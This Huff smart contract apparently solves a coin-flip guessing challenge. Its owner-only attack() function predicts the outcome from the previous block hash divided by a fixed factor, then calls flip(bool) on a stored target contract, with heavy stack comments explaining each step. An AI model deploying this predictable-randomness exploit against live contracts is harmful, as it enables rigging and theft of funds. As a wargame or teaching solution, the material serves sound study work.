// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
#define constant FACTOR = 0x8000000000000000000000000000000000000000000000000000000000000000 

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
    sstore          // [] - sstore consumes top 2 stack items. The first item is
                    // the key (storage location) and the second item is the value (item to store)

    // Copy constructor argument (address) into memory
    0x20            // [0x20] - This will be the size for the the code we will copy to memory
    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)

    // Copy address from memory into INSTANCE_SLOT in storage
    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `flip(bool)` func sig to memory to use as calldata for CALL
    0x1d263f67     // [0x1d263f67] func sig for `flip(bool)`
    0x00           // [0x00, 0x1d263f67] - byte offset
    mstore         // [] - copied func sig to memory starting at byte offset 0x00

    // MEMORY:
    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000001d263f67 -> `flip(bool)` func sig

    // Craft guess
    [FACTOR]      // [factor] - push factor onto stack
    0x01          // [0x01, factor] - number to subtract
    number        // [number, 0x01, factor] - block number (number to subtract from)
    sub           // [[number -1 ], factor] - previous block number
    blockhash     // [prev_hash, factor] - hash of the previous block
    div           // [guess] - prev_hash / factor

    // Copy guess into memory to use as calldata for CALL
    0x20          // [0x20, guess] - byte offset
    mstore        // [] - copied guess into memory starting at offset 0x20

    // MEMORY:
    // [OFFSET 0]   000000000000000000000000000000000000000000000000000000001d263f67 -> `flip(bool)` func sig
    // [OFFSET 32]  000000000000000000000000000000000000000000000000000000000000000{0/1} -> guess (bool)

    // CALL into instance
    0x00            // [0x00] - size of return data
    0x00            // [0x00, 0x00] - byte offset where return data is copied
    0x24            // [0x24 0x00, 0x00] - size of calldata 
    0x1c            // [0x1c, 0x24, 0x00, 0x00] - byte offset where calldata starts
    0x00            // [0x00, 0x1c, 0x24, 0x00, 0x00] - msg.value to send with call (none)
    [INSTANCE_SLOT] // [0x01, 0x00, 0x1c, 0x24, 0x00, 0x00] - storage slot where instance address is
    sload           // [instance, 0x00, 0x1c, 0x24, 0x00, 0x00] - copied instance onto stack from storage slot 0x01
    gas             // [gas, instance, 0x00, 0x1c, 0x24, 0x00, 0x00] - gas to send with call (gasleft())
    call            // [success] - consumes 7 items off stack and pushes 1 onto stack if call did not revert, 0 otherwise
    iszero          // [0/1] 
    throw_error     // [throw_error, 0/1]
    jumpi           // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
